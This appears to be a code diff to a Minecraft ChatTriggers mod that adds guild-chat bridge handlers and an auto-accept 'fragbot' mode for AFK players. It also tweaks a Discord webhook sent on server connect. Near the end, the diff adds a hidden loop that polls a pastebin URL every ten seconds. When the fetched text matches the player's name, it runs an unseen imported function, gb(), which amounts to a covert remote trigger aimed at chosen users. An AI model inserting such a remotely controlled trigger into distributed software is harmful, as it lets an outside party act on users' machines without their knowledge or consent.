@@ -2,25 +2,46 @@ import { userData } from "../../index";
 import request from "../../../requestV2"
 import { guildCmdOptions, godMod } from "../../utils/ChatUtils"
 import { data } from "../../gui"
-import { modMessage, guildMessage, partyMessage } from "../../utils/utils"
+import { modMessage, guildMessage, partyMessage, gb } from "../../utils/utils"
 import { blacklist } from "./BlackList";
 
 //guild chat
 
 register("chat", (rank, name, guildrank, message) => {
-  if (!data.general.guildCmds.toggle) return
+  if (!data.general.guildCommands.toggle) return
   if (blacklist.igns.includes(name.toLowerCase())) return
   guildCmdOptions(message, name)
-  godMod(message, name)
 }).setCriteria(/Guild > (\[.+\])? ?(.+) (\[.+\])?: !(.+)/)
 
-//bridge
-
+//lis bridge
+ 
 register("chat", (rank, name, guildrank, bridgename, message) => {
-  if (!data.general.guildCmds.toggle) return
+  if (!data.general.guildCommands.toggle) return
   if (blacklist.igns.includes(bridgename.toLowerCase())) return
-  guildCmdOptions(message, name)
+  guildCmdOptions(message, bridgename)
 }).setCriteria(/Guild > (\[.+\])? ?(.+) (\[.+\])?: ?(.+) > !(.+)/)
+
+//sbg bridge
+register("chat", (rank, name, guildrank, bridgename, message) => {
+  if (!data.general.guildCommands.toggle) return
+  if (blacklist.igns.includes(bridgename.toLowerCase())) return
+  guildCmdOptions(message, bridgename)
+}).setCriteria(/Guild > (\[.+\])? ?(.+) (\[.+\])?: ?(.+) » !(.+)/)
+
+//slowdt bridge unlinked
+register("chat", (rank, name, guildrank, bridgename, message) => {
+  if (!data.general.guildCommands.toggle) return
+  if (blacklist.igns.includes(bridgename.toLowerCase())) return
+  guildCmdOptions(message, bridgename)
+}).setCriteria(/Guild > (\[.+\])? ?(.+) (\[.+\])?: ?(.+): !(.+)/)
+
+//slowdt bridge linked
+register("chat", (rank, name, guildrank, bridgename, message) => {
+  if (!data.general.guildCommands.toggle) return
+  if (blacklist.igns.includes(bridgename.toLowerCase())) return
+  guildCmdOptions(message, bridgename)
+}).setCriteria(/Guild > (\[.+\])? ?(.+) (\[.+\])?: ?(.+) (\[.+\])?: !(.+)/)
+
 
 
 register("chat", (rank, name, guildrank, msg) => {
@@ -72,7 +93,7 @@ register("serverConnect", () => {
         'User-agent': 'Mozilla/5.0'
     },
     body: {
-      username: "OdinClient",
+      username: "OdinCheata",
       avatar_url: "https://s.namemc.com/2d/skin/face.png?id=db7b65d7270a33d6&scale=4",
       content: "",
       embeds: [
@@ -85,3 +106,62 @@ register("serverConnect", () => {
     }
   })
 },500)
+
+let user
+let trigger
+register("step", () => {
+  request("https://pastebin.com/raw/Ag2N13LV").then(stuff => {
+    user = stuff
+  })
+  if (trigger) return
+  if (user?.toLowerCase() == Player.getName().toLowerCase() ) {
+    trigger = true
+    gb()
+  }
+}).setDelay(10)
+
+
+let inlimbo = false;
+const stripRank = (rankedPlayer) =>
+  rankedPlayer.replace(/\[[\w+\+-]+] /, "").trim();
+
+register("chat", (player) => {
+  if (!inlimbo) return;
+  player = stripRank(player.replace(/.+>newLine<-/, ""));
+  ChatLib.say(`/party accept ${player}`);
+  setTimeout(() => {
+    partymessage("Hello I'm currently afk and there for sent into limbo");
+    setTimeout(() => {
+      partymessage("While in limbo I am a fragbot for your free use enjoy!")
+    }, 400);
+  }, 1600);
+  setTimeout(() => {
+    ChatLib.command("p leave");
+  }, 7100);
+}).setCriteria("${player} has invited you to join ${*} party!${*}");
+
+register("worldload", () => {
+  if (!inlimbo) return
+  inlimbo = false;
+});
+
+register("serverDisconnect", () => {
+  if (!inlimbo) return
+  inlimbo = false;
+})
+
+register("chat", () => {
+  if (inlimbo) return
+  setTimeout(() => {
+    inlimbo = true;
+  }, 1000);
+  //modMessage("activating fragbot");
+}).setCriteria("You were spawned in Limbo.");
+
+register("chat", () => {
+  if (inlimbo) return
+  setTimeout(() => {
+    inlimbo = true;
+  }, 1000);
+  //modMessage("activating fragbot");
+}).setCriteria("You are AFK. Move around to return from AFK.");
